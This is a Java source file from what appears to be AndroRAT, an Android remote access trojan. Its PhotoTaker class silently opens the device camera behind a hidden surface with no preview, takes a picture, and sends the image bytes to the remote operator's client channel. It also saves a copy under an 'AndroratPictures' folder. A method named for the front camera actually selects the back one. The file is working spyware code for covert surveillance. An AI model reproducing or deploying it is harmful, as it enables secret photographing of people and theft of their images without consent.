package my.app.Library;

import java.io.IOException;

import my.app.client.ClientListener;
import Packet.FilePacket;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.CameraInfo;
import android.sax.StartElementListener;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

import android.os.Environment;
import java.io.File;
import java.io.FileOutputStream;

public class PhotoTaker {

	Camera cam;
	ClientListener ctx;
	int chan ;
	SurfaceHolder holder;
	private int cameraId = 0;
	
	private PictureCallback pic = new PictureCallback() {

	    public void onPictureTaken(byte[] data, Camera camera) {
	    	try{	
	    		Log.i("PhotoTaker", "Before picture sent !");
		    	ctx.handleData(chan, data);
		        Log.i("PhotoTaker", "After picture sent !");
		        cam.release();
		        cam = null;
	    	}catch (Exception e){
	    		Log.e("PhotoTaker", "ERROR Sending picture !: " + e.getMessage());
	    	}
	    	
	    	
	        File pictureFileDir = getDir();

	        if (!pictureFileDir.exists() && !pictureFileDir.mkdirs()) {

	          Log.d("PhotoTaker", "Can't create directory to save image.");
	          return;

	        }

	        String photoFile = "Picture_" + "kk" + ".jpg";

	        String filename = pictureFileDir.getPath() + File.separator + photoFile;
	        Log.i("PhotoTaker", "Filepath" + filename);
	    	
	    	File pictureFile = new File(filename);

	        try {
	          FileOutputStream fos = new FileOutputStream(pictureFile);
	          fos.write(data);
	          fos.close();
	          Log.i("PhotoTaker", "File Saved");
	        }catch (Exception e){
	          Log.e("PhotoTaker", "SAving photo file");
	        }
	    }
	};
	
	private File getDir() {
		    File sdDir = Environment
		      .getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
		    return new File(sdDir, "AndroratPictures");
		  }
	
	public PhotoTaker(ClientListener c, int chan) {
		this.chan = chan ;
		ctx = c;
	}
	/*
	public boolean takePhoto() {
		Intent photoActivity = new Intent(this, PhotoActivity.class);
		photoActivity.setAction(PhotoTaker.class.getName());
		ctx.star
	}
	*/
	private int findFrontFacingCamera() {
	    int cameraId = -1;
	    // Search for the front facing camera
	    int numberOfCameras = Camera.getNumberOfCameras();
	    for (int i = 0; i < numberOfCameras; i++) {
	      CameraInfo info = new CameraInfo();
	      Camera.getCameraInfo(i, info);
	      if (info.facing == CameraInfo.CAMERA_FACING_BACK) {
	        Log.i("PhotoTaker", "Camera found " + info.facing );
	        cameraId = i;
	        break;
	      }
	    }
	    return cameraId;
	  }
	
	public boolean takePhoto() {
        if(!(ctx.getApplicationContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA))){
        	Log.e("PhotoTaker", "No camera!");
        	return false;
        }
        Log.i("PhotoTaker", "Just before Open !");
        try {
        	cameraId = findFrontFacingCamera();
        	if (cameraId == -1) {cameraId = 0;}
        	cam = Camera.open(cameraId);
        } catch (Exception e) { 
        	Log.e("PhotoTaker", "Opening camera!");
        	return false; 
        }
        
        Log.i("PhotoTaker", "Right after Open !");
        
        if (cam == null){
        	Log.e("PhotoTaker", "Cam is null");
        	return false;
        }

        
        SurfaceView view = new SurfaceView(ctx);
        Log.i("PhotoTaker", "Right after SurfaceView");
        try {
        	holder = view.getHolder();
        	cam.setPreviewDisplay(holder);
        	Log.i("PhotoTaker", "Right after PreviewDisplay");
        } catch(IOException e) { 
        	Log.e("PhotoTaker", "Setting display");
        	return false; 
        	}
        
        //cam.startPreview();
        Log.i("PhotoTaker", "Right after startPreview");
        try{
	        cam.takePicture(null, null, pic);
	        Log.i("PhotoTaker", "Right after takePicture");
	     
        }catch (Exception e){
        	
        	Log.e("PhotoTaker", "ERROR in takePicture callback: " + e);
        	cam.release();
        }
        return true;
	}
	

}
